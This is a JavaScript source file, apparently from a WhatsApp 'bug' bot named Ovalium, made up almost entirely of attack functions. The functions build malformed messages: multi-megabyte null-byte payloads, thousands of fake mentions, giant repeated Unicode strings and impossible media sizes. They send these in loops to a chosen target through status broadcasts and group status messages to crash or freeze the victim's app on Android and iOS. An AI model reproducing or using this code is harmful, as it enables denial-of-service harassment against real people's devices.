    return new Promise(r => setTimeout(r, ms));
  }
  let hitung = 0;
   for (let i = 0; i < 10; i++) {
    hitung++;
    console.clear();
    console.log(`Ovalium Executor Running...`);
    console.log(`Target   : ${target}`);
    console.log(`Loop Ke  : ${hitung}`);
    console.log(`Aksi : Mengirim...\n`);
    await audiodelay(sock, target);
    await delayExecution(sock, target);
    await Epcx(sock, target);
    await TrueNullV7(sock, target);
    await VoiceInvisible(sock, target);
    await XArrayDelay(target);
    await TrueNull(sock, target); 
    await antiSpamDelay();    
    const jeda = 500; 
    console.log(`⏳ Jeda ${jeda / 1000}s sebelum pengiriman ulang...`);

    await sleep(jeda);
  }
}


async function AllFunctionTesDelay(sock, target) {
  function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
  }
  let hitung = 0;
   for (let i = 0; i < 10; i++) {
    hitung++;
    console.clear();
    console.log(`Ovalium Executor Running...`);
    console.log(`Target   : ${target}`);
    console.log(`Loop Ke  : ${hitung}`);
    console.log(`Aksi : Mengirim...\n`);
    await audiodelay(sock, target);
    await delayExecution(sock, target);
    await Epcx(sock, target);
    await TrueNullV7(sock, target);
    await VoiceInvisible(sock, target);
    await XArrayDelay(target);
    await TrueNull(sock, target); 
    await antiSpamDelay();    
    const jeda = 4500; 
    console.log(`⏳ Jeda ${jeda / 1000}s sebelum pengiriman ulang...`);

    await sleep(jeda);
  }
}

async function AllFunctionIos(sock, target) {
  function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
  }
  let hitung = 0;
   for (let i = 0; i < 10; i++) {
    hitung++;
    console.clear();
    console.log(`Ovalium Executor Running...`);
    console.log(`Target   : ${target}`);
    console.log(`Loop Ke  : ${hitung}`);
    console.log(`Aksi : Mengirim...\n`);
    await iosLx(sock, target);
    await iosinVisFC3(sock, target);    
    await antiSpamDelay();    
    const jeda = 4500; 
    console.log(`⏳ Jeda ${jeda / 1000}s sebelum pengiriman ulang...`);

    await sleep(jeda);
  }
}

///FUNCTION BUGG

async function MsgAudioxxx(sock, target, mention) {
  try {

    const Docktring = {
      viewOnceMessage: {
        message: {
          groupStatusMessageV2: {
            message: {
              interactiveResponseMessage: {
                nativeFlowResponseMessage: {
                  name: "galaxy_message",
                  paramsJson: "\x10" + "\u0000".repeat(1030000),
                  version: 3
                }
              }
            }
          }
        }
      }
    };

    const Whatsapp = {
      viewOnceMessage: {
        message: {
          groupStatusMessageV2: {
            message: {
              interactiveResponseMessage: {
                nativeFlowResponseMessage: {
                  name: "call_permission_request",
                  paramsJson: "\x10" + "\u0000".repeat(1030000),
                  version: 3
                }
              }
            }
          }
        }
      }
    };

    const MsgVn = {
      viewOnceMessage: {
        message: {
          groupStatusMessageV2: {
            message: {
              interactiveResponseMessage: {
                nativeFlowResponseMessage: {
                  name: "address_message",
                  paramsJson: "\x10" + "\u0000".repeat(1030000),
                  version: 3
                }
              }
            }
          }
        }
      }
    };

    for (const msg of [Docktring, Whatsapp, MsgVn]) {
      await sock.relayMessage(
        "status@broadcast",
        msg,
        {
          messageId: undefined,
          statusJidList: [target],
          additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }]
          }]
        }
      );
    }

    const msg1 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "_", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: Math.floor(Date.now() / 1000)
    });

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });

    const msg2 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "\u0000", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: Math.floor(Date.now() / 1000)
    });

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });

    const String = {
      message: {
        ephemeralMessage: {
          message: {
            audioMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
              mimetype: "audio/mpeg",
              fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
              fileLength: 99999999999999,
              seconds: 99999999999999,
              ptt: true,
              mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
              fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
              directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
              mediaKeyTimestamp: 99999999999999,
              contextInfo: {
                mentionedJid: [
                  "@s.whatsapp.net",
                  ...Array.from({ length: 1900 }, () =>
                    `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                  )
                ],
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "133@newsletter",
                  serverMessageId: 1,
                  newsletterName: "𞋯"
                }
              },
              waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
            }
          }
        }
      }
    };

    const msgX = await generateWAMessageFromContent(target, String.message, { userJid: target });

    await sock.relayMessage("status@broadcast", msgX.message, {
      messageId: msgX.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });

    if (mention) {
      await sock.relayMessage(target, {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msgX.key,
              type: 25
            }
          }
        }
      }, {
        additionalNodes: [{
          tag: "meta",
          attrs: { is_status_mention: "!" }
        }]
      });
    }

    console.log(`✅ Bug terkirim ke target: ${target}`);

  } catch (err) {
    console.log("Error MsgAudio:", err);
  }
}

async function Trxdt(sock, target) {
  try {
  const msg1 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: ".menu", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(currentRepeatCount),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }, { participant: target });

    const msg2 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "x", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(currentRepeatCount),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }, { participant: target });

    const Audio = {
      message: {
        ephemeralMessage: {
          message: {
            audioMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
              mimetype: "audio/mpeg",
              fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
              fileLength: 999999999999,
              seconds: 99999999999999,
              ptt: true,
              mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
              fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
              directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
              mediaKeyTimestamp: 99999999999999,
              contextInfo: {
                mentionedJid: [
                  "@s.whatsapp.net",
                  ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 90000000) + "@s.whatsapp.net")
                ],
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "133@newsletter",
                  serverMessageId: 1,
                  newsletterName: "𞋯"
                }
              },
              waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
            }
          }
        }
      }
    };

    const msgAudio = await generateWAMessageFromContent(target, Audio.message, { userJid: target });

    await sock.relayMessage("status@broadcast", msgAudio.message, {
      messageId: msgAudio.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    const stickerMsg = {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
        mimetype: "image/webp",
        height: 9999,
        width: 9999,
        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
        fileLength: 12260,
        mediaKeyTimestamp: "1743832131",
        isAnimated: false,
        stickerSentTs: "X",
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
          ],
          stanzaId: "1234567890ABCDEF",
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            }
          }
        }
      }
    };

    await sock.relayMessage("status@broadcast", stickerMsg, {
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });

    if (mention) {
      await sock.relayMessage(target, {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msgAudio.key,
              type: 25
            }
          }
        }
      }, {
        additionalNodes: [{
          tag: "meta",
          attrs: {
            is_status_mention: "!"
          },
          content: undefined
        }]
      });
    }
    let msg = await generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        body : { text: "X", format: "DEFAULT" },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "\u0000".repeat(100000)
        },
    contextInfo: {
       mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 3000 },
                () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
       entryPointConversionSource: "galaxy_message"
      }
    }
  }, {});
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message
    }
  },
    {
      participant: { jid: target },
      messageId: msg.key.id
    });
    
    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
  } catch (err) {
    console.log(err.message)
  }
  console.log("SUCCES SEND BUG");
}

async function iosLx(sock, target) {
console.log(chalk.red(`SENDING BUG IOS`));
for (let i = 0; i <= 10; i++) {  
  const [janda1, janda2] = await Promise.all([
    sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: {
            locationMessage: {
              degreesLatitude: 21.1266,
              degreesLongitude: -11.8199,
              name: "Ⰶ⃟꙰。⨶AMPAS" + "𑇂𑆵𑆴𑆿".repeat(60000),
              url: "https://t.me/XWARRXXX",
              contextInfo: {
                mentionedJid: Array.from(
                  { length: 1900 },
                  (_, i) => `628${i + 1}@s.whatsapp.net`
                ),
                externalAdReply: {
                  quotedAd: {
                    advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                    mediaType: "IMAGE",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACIASAMBIgACEQEDEQH/xAAuAAADAQEBAAAAAAAAAAAAAAAAAwQCBQEBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAIaZr4ffxlt35+Wxm68MqyQzR1c65OiNLWF2TJHO2GNGAq8BhpcGpiQ65gnDF6Av/8QAJhAAAgIBAwMFAAMAAAAAAAAAAQIAAxESITEEE0EQFCIyURUzQv/aAAgBAQABPwAag5/1EssTAfYZn8jjAxE6mlgPlH6ipPMfrR4EbqHY4gJB43nuCSZqAz4YSpntrIsQEY5iV1JkncQNWrHczuVnwYhpIy2YO2v1IMa8A5aNfgnQuBATccu0Tu0n4naI5tU6kxK6FOdxPbN+bS2nTwQTNDr5ljfpgcg8wZlNrbDEqKBBnmK66s5E7qmWWjPAl135CxJ3PppHbzjxOm/sjM2thmVfUxuZZxLYfT//xAAcEQACAgIDAAAAAAAAAAAAAAAAARARAjESIFH/2gAIAQIBAT8A6Wy2jlNHpjtD1P8A/8QAGREAAwADAAAAAAAAAAAAAAAAAAERACEw/9oACAEDAQE/AIRmycHh/9k=",
                    caption: "𑇂𑆵𑆴𑆿".repeat(60000)
                  },
                  placeholderKey: {
                    remoteJid: "0s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                  }
                }
              }
            }
          }
        }
      },
      { participant: { jid: target } }
    ),
    sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: {
            locationMessage: {
              degreesLatitude: 21.1266,
              degreesLongitude: -11.8199,
              name: "Ⰶ⃟꙰。⨶𝙊𝙏𝘼𝙓 𝙄𝙈 𝙃𝙀𝙍𝙀⧃" + "𑇂𑆵𑆴𑆿".repeat(60000),
              url: "https://t.me/Otapengenkawin",
              contextInfo: {
                mentionedJid: Array.from(
                  { length: 1900 },
                  (_, i) => `628${i + 1}@s.whatsapp.net`
                ),
                externalAdReply: {
                  quotedAd: {
                    advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                    mediaType: "IMAGE",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACIASAMBIgACEQEDEQH/xAAuAAADAQEBAAAAAAAAAAAAAAAAAwQCBQEBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAIaZr4ffxlt35+Wxm68MqyQzR1c65OiNLWF2TJHO2GNGAq8BhpcGpiQ65gnDF6Av/8QAJhAAAgIBAwMFAAMAAAAAAAAAAQIAAxESITEEE0EQFCIyURUzQv/aAAgBAQABPwAag5/1EssTAfYZn8jjAxE6mlgPlH6ipPMfrR4EbqHY4gJB43nuCSZqAz4YSpntrIsQEY5iV1JkncQNWrHczuVnwYhpIy2YO2v1IMa8A5aNfgnQuBATccu0Tu0n4naI5tU6kxK6FOdxPbN+bS2nTwQTNDr5ljfpgcg8wZlNrbDEqKBBnmK66s5E7qmWWjPAl135CxJ3PppHbzjxOm/sjM2thmVfUxuZZxLYfT//xAAcEQACAgIDAAAAAAAAAAAAAAAAARARAjESIFH/2gAIAQIBAT8A6Wy2jlNHpjtD1P8A/8QAGREAAwADAAAAAAAAAAAAAAAAAAERACEw/9oACAEDAQE/AIRmycHh/9k=",
                    caption: "𑇂𑆵𑆴𑆿".repeat(60000)
                  },
                  placeholderKey: {
                    remoteJid: "0s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                  }
                }
              }
            }
          }
        }
      },
      { participant: { jid: target } }
    )
  ]);

  await sleep(1000);

  await Promise.all([
    sock.sendMessage(target, {
      delete: {
        fromMe: true,
        remoteJid: target,
        id: janda1
      }
    }),
    sock.sendMessage(target, {
      delete: {
        fromMe: true,
        remoteJid: target,
        id: janda2
      }
    })
  ]);
  }
}

async function CStatusV1(sock, target) {
const msg1 = {
  viewOnceMessage: {
    message: {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\x10" + "\u0000".repeat(1030000),
              version: 3
            }
          }
        }
      }
    }
  }
};

const msg2 = {
  viewOnceMessage: {
    message: {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10" + "\u0000".repeat(1030000),
              version: 3
            }
          }
        }
      }
    }
  }
};

const msg3 = {
  viewOnceMessage: {
    message: {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: "\x10" + "\u0000".repeat(1030000),
              version: 3
            }
          }
        }
      }
    }
  }
};

for (const msg of [msg1, msg2, msg3]) {
  await sock.relayMessage(
    "status@broadcast",
    msg,
    {
      messageId: null,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target }
                }
              ]
            }
          ]
        }
      ]
    }
  );
}

const X = {
  musicContentMediaId: "589608164114571",
  songId: "870166291800508",
  author: "ោ៝".repeat(1000),
  title: "XxX",
  artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
  artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
  artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
  artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
  countryBlocklist: true,
  isExplicit: true,
  artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
};

const msg = generateWAMessageFromContent(
  target,
  {
    buttonsMessage: {
      contentText: "X",
      footerText: "\u0000",
      buttons: [
        {
          buttonId: "X",
          buttonText: {
            displayText: "\n".repeat(9000),
          },
          type: 1,
        },
      ],
      headerType: 1,
      contextInfo: {
        participant: target,
        mentionedJid: [
          "131338822@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "X",
        participant: target,
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          },
        },
      },
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "\u0000".repeat(104500),
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath:
          "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
          participant: target,
          remoteJid: "X",
          stanzaId: "1234567890ABCDEF",
          mentionedJid: [
            "131338822@s.whatsapp.net",
            ...Array.from(
              { length: 5600 },
              () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            ),
          ],
        },
        streamingSidecar:
          "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath:
          "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
          {
            embeddedContent: {
              X,
            },
            embeddedAction: true,
          },
        ],
      },
    },
  },
  {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
  }
);

await sock.relayMessage("status@broadcast", msg.message, {
  messageId: msg.key.id,
  statusJidList: [target],
  additionalNodes: [
    {
      tag: "meta",
      attrs: {},
      content: [
        {
          tag: "mentioned_users",
          attrs: {},
          content: [
            {
              tag: "to",
              attrs: { jid: target },
              content: undefined,
            },
          ],
        },
      ],
    },
  ],
});
}

async function SplashWorld(sock, target) {
  try {
    let msg = await generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        body : { text: "X", format: "DEFAULT" },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "\u0000".repeat(100000)
        },
    contextInfo: {
       mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 3500 },
                () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
       entryPointCenversionSource: "galaxy_message"
      }
    }
  }, {});
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message
    }
  },
    {
      participant: { jid: target },
      messageId: msg.key.id
    });
    
    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
  } catch (err) {
    console.log(err.message)
  }
}

async function chofm(target) {
  await sock.relayMessage(target, {
    botInvokeMessage: {
      message: {
        listResponseMessage: {
          title: " ? Mampus ",
          description: " #Mampus ",
          listType: 1,
          singleSelectReply: {
            selectedRowId: "\"f*ck bastard\""
          },
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            fromMe: false,
            remoteJid: " dnd ",
            participant: "ddd",
            urlTrackingMap: Array.from({ length: 209000 }, (_, z) => ({
              participant: `62${z + 720599}@s.whatsapp.net`,
              type: 1,
            })),
            
          }
        }
      }
    }
  }, { participant: { jid: target }, userJid: null })
}


async function sxxzzzs(sock, target) {
   const ment = [
      "0@s.whatsapp.net",
      ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
   ];

   const msg = await generateWAMessageFromContent(target, { 
      stickerMessage: {
         url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
         fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
         fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
         mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
         mimetype: "image/webp",
         height: 9999,
         width: 9999,
         directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
         fileLength: 12260,
         mediaKeyTimestamp: Math.floor(Date.now() / 1000), // FIX: ubah ke number (unix timestamp)
         isAnimated: false,
         stickerSentTs: Date.now(), // FIX: ubah ke number
         isAvatar: false,
         isAiSticker: false,
         isLottie: false,
         contextInfo: {
            mentionedJid: ment,
            stanzaId: "1234567890ABCDEF",
            quotedMessage: {
               paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
               }
            }
         }
      }
   }, { 
      timestamp: Date.now(),
      userJid: target 
   });
   
   await sock.relayMessage("status@broadcast", msg, {
      messageId: null,
      participant: { jid: target },
      statusJidList: [target],
      additionalNodes: [{
         tag: "meta",
         attrs: {},
         content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
               tag: "to",
               attrs: { jid: target },
               content: undefined
            }]
         }]
      }]
   });
   
   const msg1 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
         message: {
            interactiveResponseMessage: {
               body: {
                  text: "-OV4LIUM",
                  format: "DEFAULT"
               },
               nativeFlowResponseMessage: {
                  name: "call_permission_request",
                  paramsJson: "\x10".repeat(102100),
                  version: 3
               },
               contextInfo: {
                  mentionedJid: [
                     "0@s.whatsapp.net",
                     ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                  ],
                  remoteJid: "status@broadcast",
                  forwardingScore: 9999,
                  isForwarded: true
               }
            }
         }
      }
   }, {
      timestamp: Date.now(),
      userJid: target,
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
   });
  
   await sock.relayMessage("status@broadcast", msg1, {
      messageId: null,
      participant: { jid: target },
      statusJidList: [target],
      additionalNodes: [{
         tag: "meta",
         attrs: {},
         content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
               tag: "to",
               attrs: { jid: target },
               content: undefined
            }]
         }]
      }]
   });

   const msg2 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
         message: {
            interactiveResponseMessage: {
               body: { 
                  text: "Kill You", 
                  format: "DEFAULT" 
               },
               nativeFlowResponseMessage: {
                  name: "call_permission_request",
                  paramsJson: "\x10".repeat(1045000),
                  version: 3
               },
               entryPointConversionSource: "call_permission_message"
            }
         }
      }
   }, {
      timestamp: Date.now(),
